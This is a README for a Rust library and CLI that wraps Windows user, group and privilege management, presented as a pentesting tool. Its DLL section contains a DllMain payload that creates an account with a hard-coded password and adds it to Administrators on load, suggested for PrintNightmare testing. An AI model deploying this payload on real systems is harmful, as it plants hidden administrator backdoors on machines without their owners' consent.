# netuser-rs
Rust bindings to Microsoft Windows users / groups management API.

> **DISCLAIMER.** All information contained in this repository is provided for educational and research purposes only. The owner is not responsible for any illegal use of included code snippets.

The program is presented in two variants: DLL (for injection into the process) and EXE (User-friendly CLI).
### Features:
* Operations over local users:
    * Creating local users with adding account description (Comment Section) 
    * Deleting a local user account
    * Change password for local user account
    * Get all user accounts in the system
    * Get a detailed description of a user account (net user username analog)
* Operations over user account SIDs:
    * Get a user account name by its SID and vice versa
    * SID validation
    * Convert SID to string and vice versa
* Operations over local groups:
    * Get all members of a local group
    * Get all groups of the user account
    * Remove a user account from a group
    * Add a user account to a group
* Operations over user account privileges:
    * Add privileges to a user account
    * Remove user account privileges
    * Get LUID by privilege name and vice versa
## Using as a crate
Add following line to ```Cargo.toml```:
```toml
[dependencies]
netuser_rs = { git = "https://github.com/secur30nly/netuser-rs.git", branch = "main" }
```

And use in your code:
```rust
fn main() {
    let username = "pentester";
    let password = "P@ssw0rd123!";
    let description = Some("Pentester account. Don't worry!");  // Or None
    if let Err(err) = netuser_rs::users::add_user(username, password, &description) {
        println!("Error: {} - {}\n", err, netuser_rs::win_err_text(err));
        return;
    }
}
```

## Using as a CLI program
To build as an EXE, run the following command after cloning the repository:
```
C:\Users\secur30nly\netuser-rs> cargo build --release
```
The final EXE will be located at the path netuser-rs/target/release/netuser-rs.exe. 

After the building, you can run the program with the ```-h``` flag to open the help menu:
<img width="1116" alt="image" src="https://github.com/secur30nly/netuser-rs/assets/62586375/97dd48a5-b562-4726-ae4b-bfff61bca6f0">

For the test, let's create a user and add it to the admin group, then print the details of the created account:
<img width="1059" alt="image" src="https://github.com/secur30nly/netuser-rs/assets/62586375/f4c9a94a-090e-48a5-93f4-ecdae73588f5">

## Using as a DLL
This option is useful if you need to perform the necessary operations when joining a process (for example: testing the Printnightmare vulnerability). 
To build as a DLL, you must uncomment the following line in the ```Cargo.toml``` file:
```toml
#[lib]
#crate-type = ["cdylib"]
```
After that you need to edit the functions to be run and the parameters to them:
```rust
#[no_mangle]
#[allow(unused_variables, non_snake_case, unused_must_use)]
unsafe extern "system" fn DllMain(_: *const u8, call_reason: u32, _: *const u8) -> bool {
    let username = "pentester"; // Change this
    let description: Option<String> = None; // Change this  (if description required: Some("Description".to_owned()) )
    let password = "P@ssw0rd12345!!!"; // Change this
    let groupname = "Administrators"; // Change this
    match call_reason {
        DLL_PROCESS_ATTACH => {
            users::add_user(username, password, &description).unwrap(); // Change this
            groups::add_user_to_group(username, groupname).unwrap(); // Change this
        }
        DLL_PROCESS_DETACH => {}
        _ => {}
    }

    true
}
```

And finally run the building as a DLL:
```
C:\Users\secur30nly\netuser-rs> cargo build --release --lib
```
The final DLL will be located at the path netuser-rs/target/release/netuser-rs.dll.
